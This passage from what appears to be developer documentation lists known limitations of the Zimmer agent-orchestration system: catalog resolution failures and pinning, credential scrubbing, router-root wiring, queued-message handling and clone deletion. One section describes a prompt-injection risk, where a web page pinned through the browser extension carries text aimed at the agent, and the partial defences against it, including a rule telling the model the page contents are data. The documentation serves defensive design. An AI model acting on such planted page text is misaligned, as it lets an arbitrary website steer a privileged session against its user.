`ClaudeMcpCredentialWriter#credential_key_for` and their Codex/Pi siblings — and that mapping is
only well-defined once AIR stops flattening the target name in the first place.

### The catalog-failure banner is per-process

Every config facade (`AgentRootsConfig`, `ServersConfig`, `SkillsConfig`, `HooksConfig`,
`PluginsConfig`, `ReferencesConfig`) rescues `CatalogError` to an empty array, so a catalog that
cannot resolve degrades the session form to empty pickers rather than a 500. On its own that made a
broken catalog look exactly like a fresh install with nothing configured
([#112](https://github.com/tadasant/zimmer/issues/112)). `AirCatalogService.resolve_failure` now
records every failed resolve — including the no-fallback case `degraded?` cannot see — and the
session form renders it as a banner.

`Mcp::Tools::GetConfigs` carries the same fact to agents, which read the catalog through those same
façades — but not the same detail. The banner prints `air resolve`'s own error text, and that process
is given `AIR_GITHUB_TOKEN`, so the MCP surface reports only *that* resolution failed and when. Same
fact, different fidelity, different audience.

The error text is scrubbed before it is recorded: `AirCatalogService#record_failure` replaces every
credential this process holds — all of `SecretsLoader.all`, plus a process-env `AIR_GITHUB_TOKEN` —
with a `[REDACTED:NAME]` marker, so `/sessions/new`, which has no Rails-layer authentication
([#312](https://github.com/tadasant/zimmer/issues/312)), cannot render one
([#319](https://github.com/tadasant/zimmer/issues/319)). That is defense in depth, not a guarantee:
`air resolve` has never been observed echoing its environment, and the scrub only knows values Zimmer
itself holds — a credential it never issued, in text it never saw, would still print. It is also
narrower than the surface: the same unscrubbed message still reaches `Rails.logger`, which is an
operator-only channel and deliberately left alone.

The residual limit: that flag is process-local, like the rest of the in-memory catalog cache. It
describes what *this* web process last saw. With more than one web process, a form served by a worker
that has not yet retried shows the banner while its neighbour does not — the pickers and the banner
are at least always consistent with each other, because both come from the same process's cache.

### A missing artifact body is invisible until `air prepare`

AIR validates references *between* entries but never checks that a `path` exists on disk. A
registered hook or skill with no body resolves clean, slips past Zimmer's stderr marker check, and is
silently skipped by the adapter with a warning nobody reads.

`git-push-ci-reminder` sat that way for a while — registered in `hooks/hooks.json`, bundled into the
`ci-workflow` plugin, `default_in_roots: ["zimmer"]`, and with no directory behind it
([#65](https://github.com/tadasant/zimmer/issues/65)). The body exists now, and the test suites for
`SkillsConfig` and `HooksConfig` assert every registered artifact really has one — but that is a
Zimmer-side test, not something AIR enforces.

### AIR parses the config files it just wrote without a guard, and names no file when it fails

`@pulsemcp/air-sdk` `JSON.parse`s each of the adapter's `configFiles` — `.mcp.json` and
`.claude/settings.json` — with no `try`/`catch` in `transform-runner.js`, and `@pulsemcp/air-core`
does the same for `air.json` and the catalog indexes. Every parse of those same two config files
inside the *Claude adapter* is guarded; the SDK's and core's are not. So a failed parse exits 1 with
Node's bare parse error — no path, no file, nothing to act on.

For the two files in the target directory it is only reachable as a race, which was verified against
the pinned CLI: neither an already-corrupt `.mcp.json` nor an already-corrupt `.claude/settings.json`
reproduces it, because the adapter rescues its own parse failure and rewrites both from scratch
before the SDK reads them. It takes a second writer changing one between the adapter's write and the
SDK's read, which `air prepare` invites by running over a session directory a previous job may still
be tearing down. A malformed `air.json` or catalog index reaches the same signature by a different,
deterministic route.

Zimmer cannot fix the upstream parse, so it treats the signature as transient, retries it, and
prepends its own description of the target's config files to the error (skipped when AIR's message
already carries a path). That is a workaround for a message that should have carried one: if AIR ever
adds it, the enrichment becomes redundant rather than wrong. Tracked upstream of Zimmer's fix in
[zimmer#590](https://github.com/tadasant/zimmer/issues/590). First seen in production 2026-08-21 (session 6787), which was ~16 hours into a task
on a clone already prepared many times. The unhandled error failed the whole job; what recovered it
was Zimmer's orphan cleanup restarting the session ~20s later, at the cost of a full MCP reconnect
mid-work — not anything the prepare path chose.

### Catalog pinning is real code for a catalog this deployment does not run

Only a `github://` catalog can be pinned, and Zimmer's default catalog — in-image or mounted via
`AIR_CONFIG` — is entirely local paths. So on this deployment `pinnable_catalogs` is empty,
`resolved_sha_for` is never called, the settings page offers no pin to write, and `AIR_CATALOG_REF`
matches nothing. The machinery is correct and exercised in CI; it is simply inert here, and becomes
live the moment an operator points `AIR_CONFIG` at a catalog that declares `github://` sources.

Two things made that inertness read as live, and both are fixed. The settings page rendered an empty
**Catalog Pins** card — prose, no rows, and a save button that did nothing — and now hides it unless
at least one catalog is pinnable. `AIR_CATALOG_REF` pinned nothing silently, and now warns at boot
and resolves the catalog unrewritten.

`AIR_CATALOG_REF` is narrower than it reads, in a way worth stating plainly: it lives inside
`staging.rb`'s `ENV.fetch("AIR_CONFIG")` fallback, so a deployment that sets `AIR_CONFIG` — which is
how you mount your own catalog, and what `config/deploy.production.yml` does — never reaches it.
`production.rb` has no equivalent at all. It therefore applies to the in-image `air.production.json`
and nothing else.

:::note[A pin rewrites the catalog into `tmp/`, and relative index paths have to be made to follow it]
Both pinning paths write the rewritten catalog to a new location — `tmp/air.staging.json` for
`AIR_CATALOG_REF`, `tmp/air.effective.<pid>.json` for a `CatalogPin` row — and AIR resolves a
catalog's local index paths **relative to the config file's own directory**. Zimmer's catalogs
declare exactly such paths (`./skills/skills.json`), so a copy resolved from `tmp/` used to look for
`tmp/skills/skills.json` and find nothing: an empty catalog, and one nothing complained about,
because a resolve that finds no index files drops no references and so trips none of the
[stderr-based detection](/air/zimmer-integration/#a-dangling-reference-is-treated-as-a-failed-resolve).

The `CatalogPin` path was reachable: `effective_air_json_path` switched to the tmp copy when **any**
`catalog_pins` row existed — a row naming a catalog `air.json` never mentions was enough — and while
the settings form cannot create one on a local-only catalog, `/supervisor/catalog_pins` is full
Administrate CRUD and can. On this deployment that emptied a 12-root catalog to 0.

Three changes closed it ([#1078](https://github.com/tadasant/zimmer/issues/1078)):

- **A pin that matches nothing changes nothing.** If applying the pin set leaves the parsed document
  identical, `effective_air_json_path` returns the base path and no copy is written — the same shape
  `AIR_CATALOG_REF` already used for an unmatched rewrite.
- **A copy that does get written carries absolute source paths.** `AirCatalogRefRewriter.absolutize_sources`
  anchors every relative local source path at the base config's own directory before the copy is
  written, so it resolves identically from `tmp/`. It mirrors AIR's own rules rather than guessing at
  them — `getScheme` decides path-versus-provider (so `file://` counts as local and a bare `catalogs`
  entry like `"vendor/shared"` is a path, not a shorthand), and the anchoring matches `path.resolve`,
  which does not expand `~`. `AirCatalogRefRewriter.relocated` composes the pin and the anchoring, and
  is the single entry point both pinning paths call, so the two cannot drift.
- **An empty resolve is now a failed resolve.** See
  [an empty resolve is a failed resolve](/air/zimmer-integration/#an-empty-resolve-is-a-failed-resolve-too).
:::

Reported as [#69](https://github.com/tadasant/zimmer/issues/69).

### The catalog snapshot trusts whichever process wrote last

Every process serves the newest `CatalogSnapshot` row
([the snapshot is the source of truth](/air/zimmer-integration/#the-snapshot-is-the-source-of-truth)),
and the newest row is the last one written, not the one written by the newest code. During a
deploy the old worker is still running for a short while after the new one boots. If its `*/15`
catalog refresh fires in that window, it stores a tree resolved from the *previous* image's in-repo
catalog, and every process serves that until the next refresh, up to 15 minutes later. Only
in-repo catalog changes (`skills/`, `roots.json`, `mcp.json`) are affected, since both images
fetch the same github sources. **Refresh catalogs** clears it immediately.

The same rule costs a developer something locally: editing `skills/skills.json` in a running dev
server no longer shows up within a minute, because no process re-resolves on a timer. Press
**Refresh catalogs**, or restart.

A snapshot also says nothing about the process reading it. `degraded?` means "the latest refresh
attempt failed", wherever it ran. A web container whose own boot-time `air update` fails marks
the fleet's catalog degraded until the worker's next successful refresh, even though the worker's
catalog was fine all along.

Replaced the web-side refresh thread tracked in [#98](https://github.com/tadasant/zimmer/issues/98).

### The AIR CLI version is pinned in two places, and the catalog config in two files

`Dockerfile.base` bakes `@pulsemcp/air-cli@0.13.0` (plus four adapters, plus a `.air-version-<v>`
marker); `AirPrepareService::AIR_CLI_VERSION` is the version the app looks for. Separately, `air.json`
(dev/test) and `air.production.json` (in-image) declare the same six sources and differ only in their
`description`. Both pairs are still kept in step by hand — the duplication is real.

What changed is that drift now fails a test rather than a deploy: `test/contracts/air_config_parity_test.rb`
asserts every `@pulsemcp/air-*` pin and the version marker match `AIR_CLI_VERSION`, and that the two
catalog configs are identical outside `description`. A mismatched marker would otherwise make every
fresh container throw away its baked-in AIR install and re-download the CLI on a session's launch path.

Fixed in [#68](https://github.com/tadasant/zimmer/issues/68), which added that parity test. The
duplication above is what the test guards rather than removes.

### Seven roots pointed at a repository that does not exist

`agent-orchestrator`, `agents`, `catalog-management`, and the four `catalog-mgmt-*` phases all carried
`"url": "https://github.com/tadasant/zimmer-catalog.git"`. That repository does not exist — `gh repo
view` 404s it even for the account that owns this one — so picking any of them could only fail at
`GitCloneService.create_clone`. `agent-orchestrator` also carried `display_name: "Zimmer"`, the same
as the `zimmer` root, making the two indistinguishable in the new-session picker.

All seven were leftovers from the monorepo split, when the Rails app lived at
`agents/agent-orchestrator` and the AIR artifacts at `agents/` inside a larger catalog repo.

Fixed in [#67](https://github.com/tadasant/zimmer/issues/67): `agent-orchestrator` and `agents` were
`zimmer` under its pre-rename name and were removed, which also retired the duplicate display name;
`catalog-management` and its four phases kept their names and moved to `tadasant/zimmer`, the repo
that actually holds the catalog they maintain. The catalog now ships ten roots and every one of them
clones. What the fix did *not* remove is the reverse-lookup ambiguity below — it widened it.

### Page content from the browser extension is untrusted text in a priority prompt

The [browser extension](/extend/browser-extension/) puts whatever page you pinned — any site, not
just Zimmer's own — into a router session's prompt, and that session is `web_ui` genesis and runs as
priority. A page can carry text written for the agent that reads it. What stands in the way is
narrow: the extension captures only text a reader could see (so a `display:none`, off-screen or
pixel-clipped payload never leaves the browser; text in the page's colour on the page's background
still does), Zimmer neutralizes the block's own tags in page-supplied text so the page cannot close the
block and forge the human's message, and the block says its contents are data, never instructions.
Visible text that argues with the agent is still visible text, and nothing sandboxes a router
session that decides to act on it. Pin pages you would be comfortable having an agent read.

### The baseline orchestrator root can't spawn downstream sessions out of the box

🔴 `zimmer-orchestrator` — the root behind every quick-router / chat-bubble submission — ships with **no**
default artifacts: no routing skill, and no session-orchestration MCP server. It resolves and starts,
but it cannot *route*. A quick-router submission therefore lands as an ordinary agent session cloning
`tadasant/zimmer` at its root, which is rarely what the prompt asked for. Treat the quick router as
"start a session from a prompt", not "dispatch to the right root", until this is finished. The
[browser extension](/extend/browser-extension/) lands on the same root, so it makes this gap more
visible, not less: from any page it is "start a session with this page attached".

The obvious wiring — `default_in_roots: ["zimmer-orchestrator"]` on the `zimmer-sessions` catalog entry —
is deliberately **not** done, because it is unsafe for a stock deployment. `zimmer-sessions`' URL in
the **in-image** catalog is the placeholder `https://zimmer.example.com/...` (only its `X-API-Key`
header is a `${VAR}`, so `SecretsInterpolator` never rewrites the host), and
`RuntimeConfigPostProcessor#retarget_zimmer_servers_to_current_env!` early-returns in production
(`return if Rails.env.production?`). Dev and staging rewrite that placeholder to the instance's real
`ZIMMER_*_BASE_URL`; a **production** instance running the in-image catalog does not, so its router
sessions would dial a dead host and — after `RetryBudget::MCP_CONNECTION` is spent — be failed outright
(`AgentSessionJob` → `session.fail!`).

That prod no-op is only sound under the assumption written into its own comment: that production
"already point[s] at the instance serving the session" — true for an instance running its **own**
catalog via `AIR_CONFIG` (see [Pointing an instance at your own catalog](/air/artifacts/#pointing-an-instance-at-your-own-catalog)),
false for one running the in-image fallback. Both configurations exist, so the safe default is to ship
no session server at all.

The auto-injected `zimmer-self-session` server is unaffected either way: `SelfSessionInjector` builds
its URL from `ZIMMER_*_BASE_URL` directly rather than from the catalog. To give the router real
dispatch, an operator must wire a session-scoped Zimmer MCP server whose URL resolves in *their*
environment — a custom `AIR_CONFIG` catalog with real URLs, or lifting the prod retarget no-op. See
`app/services/runtime_config_post_processor.rb` and `app/services/self_session_injector.rb`.

### The router root's two names split its cost and filter history

`token_usages.agent_root` is a plain string written at spend time, and the router root has two names
(`zimmer-orchestrator` and its deprecated `zimmer-router` alias — see
[The router root's two names](/air/agent-roots/#the-router-roots-two-names)). Nothing rewrites the
old rows, so `CostAnalytics#by_agent_root` reports router spend under both names forever: on
`/costs`, in `get_costs`, and in `GET /api/v1/costs`. The sessions index's agent-root filter is a
datalist over `AgentRootsConfig.all`, so it offers both entries with the history split between them.

Narrowing the Costs page inherits the split rather than revealing it: *Only this* on a router row
carries one of the two names, and the resulting page is honest about what it filtered on and silent
about the other half sitting under the sibling name. Compare both rows before reading a router
figure as the router's total.

That is the deliberate price of not rewriting rows. Backfilling `token_usages` and
`sessions.metadata` would collapse the two, but it would also erase the record of which name a
session was actually created under, and the alias exists precisely so that record stays resolvable.

### Every root is indistinguishable to the reverse lookup

All ten roots have `"url": "https://github.com/tadasant/zimmer.git"` and no `subdirectory`: `zimmer`,
`general-agent`, `fleet-maintenance`, `zimmer-orchestrator` and its `zimmer-router` alias,
`catalog-management`, and the four `catalog-mgmt-*` phases. The alias pair are separate catalog
entries with byte-identical coordinates, which is what makes the alias work — and also what makes
them, like the rest, indistinguishable to the reverse lookup.

It was five of twelve before [#67](https://github.com/tadasant/zimmer/issues/67); repointing the
`catalog-mgmt-*` family off the repository that does not exist and onto this one made it ten of ten.
That is a wider blast radius for the same latent fallback, and it was the accepted price of every
root being clonable — a root at a real URL that resolves ambiguously beats a root at a URL that
resolves to nothing.

`AgentRootsConfig#find_for_session` prefers `metadata["agent_root_key"]`, but its fallback matches on
`(url, subdirectory)` and returns the first hit — `zimmer`. Sessions created through
`create_from_agent_root!` (which includes every quick-router session) always carry the key, so this is
latent rather than live; but a key-less session, or `Trigger#heal_stale_agent_root!`, will resolve any
of them to `zimmer`. Same root cause as [#67](https://github.com/tadasant/zimmer/issues/67).

---

## Sessions

### A Codex session's `--json` event log is a second copy of the turn, sitting in the clone

🟡 Capturing Codex's stdout into `codex_events.jsonl`
([#109](https://github.com/tadasant/zimmer/issues/109)) is what lets Zimmer be *told* which rollout is
this session's rather than infer it, but the file is the whole stream, not just the first line Zimmer
reads: it grows for the life of the turn, roughly mirroring the rollout's own content, and nothing
rotates or truncates it mid-turn. Two consequences, and the second is the one worth knowing about.

**Disk.** It is a second copy of a long session's output on the same volume `CloneDiskGuard` sizes new
clones against. Three things bound it: each spawn reopens the file with `"w"`, so a session
accumulates one turn's stream at a time rather than the whole conversation's; the file dies with the
clone; and it is the same trade `codex_stderr.log` already makes.

**It is untracked inside the session's git clone**, at the working-directory root, alongside
`codex_stderr.log` and `codex_last_message.txt` — and nothing excludes any of them. So an agent that
runs `git add -A && git commit` commits its own conversation into the user's branch, and
`CloneArtifactService` (which stages with `git add -A` before diffing) bakes the stream into the
archived working-tree patch. Unlike the stored transcript, that copy does not go through
`TranscriptRedactor`. This is a pre-existing property of the whole set rather than something the
event log introduces, but the event log is much the largest member of it. The fix is one line of
`.git/info/exclude` per clone, covering all four names, and it belongs with whichever service
materializes a clone rather than with the adapter that writes into one.

Truncating the file live is not available: the child holds the descriptor and appends to it, so
anything Zimmer did to the file underneath would move the offsets the child is writing at. The
alternative that costs no disk is a pipe, and that is worse here —
`ProcessLifecycleManager#resume_monitoring` exists precisely because the monitoring loop does not
always outlive the process, and a pipe whose read end goes away leaves the agent writing into a
broken pipe mid-turn.

### An unarchive whose subdirectory is gone still opens a second transcript directory

A re-clone lands back at the path the session already occupied, so a conversation keeps one
transcript directory for its whole life
([transcripts](/sessions/transcripts/#a-re-clone-lands-where-the-old-one-was)). One shape opts out
of that: `UnarchiveSessionService`'s slow path also runs when the clone root is still on disk but
the working directory beneath it — an agent root's `subdirectory` — is not. Something is standing at
the old path, so `SessionClonePath.for_recreate` declines it (`git clone` refuses a non-empty
destination, and its rollback deletes whatever it was aimed at), a fresh path is generated, and that
session writes its conversation under a second slug.

It is rare, it is bounded at one extra directory per occurrence rather than one per resume, and
`OrphanTranscriptDirectoryCleanupJob` reclaims the stray on its six-hourly pass. Reclaiming the old
path instead would mean deleting a clone root this service did not create and cannot vouch for,
which is a worse trade than one leaked directory.

### A re-clone can still be caught by an in-place delete

`AtomicCloneRemoval` normally renames a clone aside before deleting it, which is what makes the path
safe to re-clone into the moment it disappears. Its fallback — taken on `EXDEV`, or when the rename
is refused — `rm -rf`s the live path instead. `SessionClonePath` declines a path with a sibling
`<clone>.deleting-<hex>` marker beside it, and `GitCloneService` claims a caller-supplied
destination with `mkdir` and falls back to a generated path when it loses, so the two of them close
the window from both ends. What is not covered is a markerless in-place strip — the marker write is
best-effort and logs when it fails. The cost is a clone that fails to create and retries, not a
corrupted one.

### A retired queued message is recorded, not re-delivered

Archiving a session moves whatever is still queued for it to `undelivered`
([lifecycle](/sessions/lifecycle/)). That closes the silence — the archive line names the messages,
an alert fires (unless the caller forced past the archive guard, having been shown the messages —
that discard is recorded on the log plane instead of paged), and the queue can no longer claim a
delivery that is not coming — but nothing
re-routes them. If the session is later unarchived, the retired messages stay retired: `undelivered`
is terminal precisely so a weeks-old message cannot arrive as if it had just been sent. Getting the
content acted on means someone re-sending it.

Every caller-facing archive surface refuses over a queued message in every state, and `force` is the
deliberate override ([lifecycle](/sessions/lifecycle/)) — so the retirement path runs on a forced
archive or a system-initiated one, and in both cases someone or something has already decided the
message is going. The check and the transition run under one `FOR UPDATE` lock on the session row
(`Sessions::ArchiveGuard.guarded_archive!`), which every enqueue serializes on through its
foreign-key check, so a message committed before the archive is refused rather than stranded
([#1139](https://github.com/tadasant/zimmer/issues/1139)). One committed after it is the
already-archived case below. What it does not do is re-route the content: getting it acted on still means a
human re-sending it.

**Deleting a session is the uncovered path, and it is worse than archiving one.** `DELETE
/api/v1/sessions/:id` and its web twin consult nothing, and `Session has_many :enqueued_messages,
dependent: :destroy` means the rows are destroyed outright rather than retired — so there is no
`undelivered` record, no archive line naming what was lost, and no alert. Now that every archive
surface refuses, delete is the only caller-facing way left to drop a queued message in silence.

System-initiated archives — `HealthMonitorService`'s stale sweep, status-summary fork cleanup,
`SessionStatusSummaryHarvestJob` — do not consult the guard at all, so they discard silently apart
from the record the retirement leaves. That is deliberate (a refusal they could hit would be a
fleet-wide stuck state with no human to clear it), but it does mean a queue on a session the stale
sweep reaches is discarded without anyone being asked.

Nothing stops a *new* `pending` row being created for an already-archived session either — the three
`create` surfaces have no session-status guard, unlike `follow_up` and `send_now`, which reject an
archived target. That re-creates the stranded state after the archive callback has already run.
Tracked separately in [#549](https://github.com/tadasant/zimmer/issues/549). Those same surfaces are
equally unguarded against a session in `needs_input`, but that case is now handled rather than
refused: an `after_create_commit` hook schedules the delivery, because an idle session is exactly
the condition the message is waiting for.

### Seven states still hold a queued message on an idle session

A session no longer comes to rest with a message queued for it, in **either** resting state — the
`pause` transition and the `after_create_commit` hook both schedule the delivery for `needs_input`
and `waiting` alike ([lifecycle](/sessions/lifecycle/)). The invariant has edges.

`EnqueuedMessageDrainJob` refuses to deliver in seven states, and in each the message waits for that
state to clear rather than for anyone to notice: blocked on an MCP elicitation (the agent process is
still alive), parked by `AuthOutageParkService` on a quota or auth wall, `paused_by: "mcp_retry"`
with a retry already scheduled, and — for a session resting in `waiting` — already driven by a live
job, holding no runtime session id, held at the spot gate, or paused in the spot queue. Each is the
right call: delivering would spawn a second process against one clone, burn the message on the wall
that caused the park, race a live first start, hand it to a fresh start that discards it, or churn
its position against a gate that is already going to run it. Each ends in the message going out on
the turn that follows. But a park or a hold that never clears holds the message indefinitely, and
nothing says so.

A session in `failed` holds its queue too; the recovery sweeps prefer a queued message when they
auto-continue one — and since [#566](https://github.com/tadasant/zimmer/issues/566) so does every
resume that injects a `SYSTEM_RECOVERY` nudge, at `AgentSessionJob`'s choke point — so it usually
goes out, but only if something reaches the session at all.

The terminal case is an alert, not a resolution. After three failed attempts the job stops and pages,
leaving the messages `pending` — deliberately, because they are still deliverable and retiring them
to `undelivered` would destroy a message to record that one job could not deliver it. What that means
in practice is that the invariant is restored by a human giving the session a turn, and until then
the session is idle with work queued for it — and any session watching it for `session_needs_input`
is woken, because a session stuck at rest is a rest (see the settle-window entry below).

### A `session_needs_input` wake arrives up to 30 seconds late

`pause` fires at every turn boundary, including boundaries the session leaves again microseconds
later, so `session_needs_input` is held for `SessionStateMachine::NEEDS_INPUT_SETTLE_WINDOW` and
dropped unless the session is still at rest when the window closes — see
[a turn boundary is not a rest](/sessions/lifecycle/#a-turn-boundary-is-not-a-rest).

The cost is latency on the one event that can flap. A session waiting on a peer that pauses to ask a
question learns about it up to 30 seconds after the fact, and `AoEventTriggerJob` runs on its own
queue precisely *because* wakes are latency-sensitive. `session_failed` and `session_archived` are
not settled and still fire on the transition, so the event that ends most waits — a child
self-archiving — is unaffected. Broadcast (unscoped) `session_needs_input` conditions inherit the
delay too, which matters for a trigger that spawns a session on any autonomous session going idle.

The window is a constant with no per-trigger override, on the grounds that no caller wants a wake
about a state the watched session had already left. If a use case ever does need the un-settled edge,
it needs a new option rather than a smaller constant.

There is a second edge in the other direction. The rest check is status-only, so a session whose
queued message is still undelivered when the window closes — the three refusals that can hold a
session in `needs_input`, above — **does** wake its watchers. That is deliberate: nothing re-emits
this event, so suppressing there would lose the wake rather than delay it. The consequence is that
those three states also mean a watcher gets woken about a session that is idle with work stuck
behind it, which is the honest signal but not a finished one. The other four refusals are
`waiting`-only, and `resting_in_needs_input?` is false for them, so they cannot produce this wake at
all.

### 🔴 Every turn a session finishes costs a second agent turn, for the Status summary

The [Status summary](/sessions/status-summary/) is generated by **forking the session** — copying its
clone directory and running one more agent turn against the copy. The automatic trigger is the
session coming to rest, and every turn a session completes ends in exactly that transition. So on a
busy fleet the steady-state cost is roughly one extra agent turn and one extra repository copy **per
completed turn, per session**, until the fork is harvested and archived.

That is the design that was asked for, and the fork is what makes the summary specific enough to link
to a message index rather than paraphrase. But it is not a cheap feature, and there is no rate limit,
no minimum interval, and no off switch beyond not looking at it. On the automatic path
`SessionStatusSummaryGenerator` refuses when the session has not moved since the last summary — which,
on a turn boundary, it always has — when the session is in the trash, when its clone has been
reclaimed, and when there is structurally nothing to summarize (no transcript, or a session that is
itself a summary fork).

Mitigations already in place: only resting transitions trigger it (a resume into `running` does not),
a generation already in flight is never duplicated, the copy leaves out installed-dependency trees
(`vendor/bundle`, `**/node_modules`) that the summarizer never uses, the fork is archived immediately
on harvest so the clone copy is reclaimed on the normal trash path, and rendering the panel or reading
the session over MCP/REST never generates.

### A regenerated summary for an old session is written in an empty directory

Pressing **Regenerate** on a session archived long ago works, but not by restoring anything.
`DeferredCloneCleanupJob` deletes an archived session's clone once the undo window closes,
so there is no working tree left to fork; the fork is given an **empty, freshly `git init`ed
directory** to run in instead (empty so there is nothing to read, a repository because `codex exec`
refuses to start outside one), and answers from the conversation Zimmer forked it with.

That is sound for the summarizer, which is told not to run tools — but it is a real constraint on what
the blurb can contain. A summary fork for a session whose clone is gone cannot read a file, check out
a branch, or run `git log` against any real history; anything not in the transcript is not available
to it. In practice the
prompt already forbids all of that, so the difference shows up only if the summary prompt ever grows a
step that touches the filesystem. It would silently degrade for exactly the old sessions this path
exists to serve.

The scaffolded directory belongs to the fork, is reclaimed when the fork is archived on harvest, and
nothing about the source session is restored, mutated, or left behind. See
[Status summary](/sessions/status-summary/#what-a-scaffolded-fork-leaves-behind).

### The last-moment clone ownership check can refuse a legitimate delete

Every clone deletion by a reaper goes through `CloneReaper`, which re-asks the database who owns the
directory at the instant of deletion and refuses if a live session still does — see
[A clone is only deleted if nobody live still owns it](/operate/background-jobs/#a-clone-is-only-deleted-if-nobody-live-still-owns-it).
It closes the window that destroyed three sessions' uncommitted work on 2026-09-02
([#808](https://github.com/tadasant/zimmer/issues/808)), and it is deliberately biased toward
refusing.

Two ways that bias costs something:

- **Ownership is matched on the basename as well as the path.** That is what makes the check immune
  to a `clone_path` stored under a relocated or symlinked base. Clone basenames carry a timestamp and
  four random bytes, so a collision is effectively impossible — but if one ever happened, the guard
  would refuse to delete a genuinely dead clone because an unrelated live session shares its name.
- **It fails closed.** If the ownership query cannot be answered — the database is down, the
  connection pool is exhausted — nothing is deleted for as long as that lasts. Under sustained disk
  pressure that is the worse of the two failures to have chosen, because `CloneDiskGuard`'s
  reclamation path cannot free anything either.

Both cost disk, and disk is reclaimed by the next sweep. The alternative failure is a running agent's
uncommitted work, which exists nowhere else.

That bias is also why the failed-clone rollback paths (`GitCloneService#discard_failed_clone`,
`ForkSessionService#discard_partial_clone`) deliberately do **not** go through the guard. They
dispose of a directory the caller just created and no session references, so there is nothing to
protect — and a refusal there would leave a partial tree that makes the next `git clone` fail with
"destination path already exists", which is not classified as transient, turning a retryable clone
failure into a permanent session failure.

An unarchive is protected by a **time-bounded marker**, not by its status: `unarchive_started_at` is
honoured for `Session::UNARCHIVE_GRACE_PERIOD` (30 minutes). An unarchive that somehow outran that —
a `git clone` riding out the full timeout plus every retry, behind a very slow artifact replay — is
back to being reapable while it is still running. The bound is the price of not letting an unarchive
that crashes between the stamp and the `ensure` pin a clone on disk forever.

### A clone delete that cannot rename falls back to a non-atomic in-place delete

Clone deletion goes through `AtomicCloneRemoval`: the clone is renamed to a sibling
`<clone>.deleting-<hex>` tombstone and the tombstone is deleted. `rename(2)` is atomic within a
filesystem, so an interrupt — a deploy, a SIGTERM, the worker container being recreated — leaves
either the whole tree at the clone's path or nothing at it, never a half-tree wearing the clone's
name. Whatever is left behind is a tombstone, which no consumer resolves and which the sweeps in
`StaleCloneCleanupJob` (hourly) and `OrphanCloneFilesystemCleanupJob` (six-hourly) reap.

The residue is the case where the rename itself cannot be done — a cross-device rename (`EXDEV`, if
the clones base were ever a mount point with the clone below it) or a permission error. Skipping the
delete there would leak the bytes forever and, on the archive path, leave a caller believing the
clone is gone, so the fallback is the old in-place `rm -rf`. In that narrow case an interrupt can
still mangle the tree — the pre-existing hazard, taken visibly rather than silently. Two things make
it visible: it logs at `.error`, which is loud enough to page; and it drops a sibling
`<clone>.deleting-<hex>` marker *file* before deleting, so an interrupt leaves a half-tree that is
labelled and reapable rather than anonymous. The marker is removed when the delete finishes. That
labelling is also what makes "the fallback did not fire" a checkable claim — it is how #808 was
triaged, and it is only worth anything if the line is loud enough to have been there.

Two smaller edges remain. The tombstone is only unresolvable by *name*: a process that already holds
an open path inside the clone keeps reading it as the tree is unlinked. And the per-session
directories `StaleCloneCleanupJob` sweeps — scratch, the Claude config dir, the two prompt-attachment
trees — are still deleted in place; they are not clones and nothing resolves a partial one as state,
but an interrupt there still leaves a subset behind.

The guards from [#411](https://github.com/tadasant/zimmer/issues/411) stay in place either way:
archive does not preserve a mass-deletion tree as uncommitted work, and unarchive refuses to replay
one. Historically this was not rare — on 2026-08-12, the day that guard shipped, it defused nine
clones across nine sessions in one afternoon, and a read-only scan of the production clones directory
that evening found 20 of 87 clones carrying a mass-deletion tree, both figures recorded in
[#415](https://github.com/tadasant/zimmer/issues/415). `MangledCloneReportJob` is what keeps that
number visible day to day, and with the origin fixed in
[#412](https://github.com/tadasant/zimmer/issues/412) it is the signal for whether anything still
produces one.

### A session that deletes 50+ tracked files and nothing else loses those deletions on archive

The guard above separates corruption from work by shape: 50 or more deleted tracked files, and
deletions making up 95% or more of the patch. A session whose only uncommitted change is the deletion
of 50+ tracked files — "drop the vendored directory", "delete the obsolete fixtures" — has exactly
that shape, so archive drops those deletions from `working_tree.patch` and the files come back on
unarchive. The tolerance is narrow: a patch of 60 deletions needs 4 or more non-deletion entries to
stay out of the net, and one or two edits alongside the deletions are not enough.

What is lost is bounded — every dropped file still exists at `HEAD`, so `git rm` reproduces the work
in seconds — and it is not silent: the drop is logged at `.warn`, counted in the artifact metadata as
`dropped_deletions`, and stamped on the session as `mangled_clone_dropped_deletions`. Committing the
deletions before the session is archived avoids it entirely, since commits travel in the bundle
rather than the patch.

It is a `.warn` and not an `.error` because the archive-side refusal is self-healing, and paging for
each one buried the signal it was meant to carry: nine pages in one afternoon, for nine sessions that
all archived fine. The frequency is reported once a day in aggregate by `MangledCloneReportJob`
instead — see [Counting mangled clones](/operate/background-jobs/#counting-mangled-clones-without-paging-for-each-one).
The trade is deliberate: a session that legitimately deletes 50+ tracked files loses those deletions
with a warning rather than an alert, so nobody is told about *that* particular loss at the moment it
happens.

### A fork of a live clone is retried, so a fork that cannot be made now fails three times slower

`ForkSessionService` copies a clone that other processes are still writing to, and a file that
vanishes between enumeration and stat aborts the copy. That is retried — `COPY_RETRY_DELAYS` gives it
three attempts — which fixes the failure but multiplies the *failure* path: a copy that used to die
after one walk of the tree now walks it up to three times, plus 2.5 seconds of backoff, before giving
up.

The **user-initiated** fork paths (`SessionsController`, `Api::V1::SessionsController`, and the
`action_session` MCP tool) all run the fork synchronously inside the request, so a fork that cannot be
made holds a request thread for the whole of that and may hit a proxy timeout before it can return
"Failed to fork session". The budget is deliberately small for exactly this reason. Automatic
**summary** forks run in a GoodJob worker where the wait costs nothing but a thread, and they exclude
the dependency trees that make the copy slow in the first place.

The retry rides out a tree being *written to*, not a tree being *rebuilt*: a copy racing a
`bundle install` that runs for half a minute can exhaust all three attempts and still fail.

### A failed artifact preservation holds a whole clone for four days

When `CloneArtifactService#create_artifacts` fails, `DeferredCloneCleanupJob` cannot delete the clone
— it is the only remaining copy of that session's unpushed work — so it holds it for
`TRASH_RETENTION_PERIOD` and lets `EmptyTrashJob` reap it at the deadline. The alternative, deleting
the work because the copy of it failed, is worse. What the hold costs, for as long as it lasts:

- The clone's `.env` sits on disk for four days rather than the hour `StaleCloneCleanupJob` would
  have taken, and [that file carries the real Slack bot token](#every-agent-session-clone-carries-the-slack-bot-token-and-the-alert-channel-id).
- So does the whole tree, `node_modules` and `vendor/bundle` included, with nothing capping how many
  such clones accumulate.
- The session's Docker Compose resources stay up until the deadline, because teardown happens on the
  delete path this branch returns before. (`EmptyTrashJob` does tear them down; the one-hour stale
  sweep never did, so the hold trades a longer leak for one that actually ends.)

Unarchiving inside the window takes `UnarchiveSessionService`'s quick path, which adopts the clone
as it stands — it applies none of the mass-deletion validation the artifact path applies, so a clone
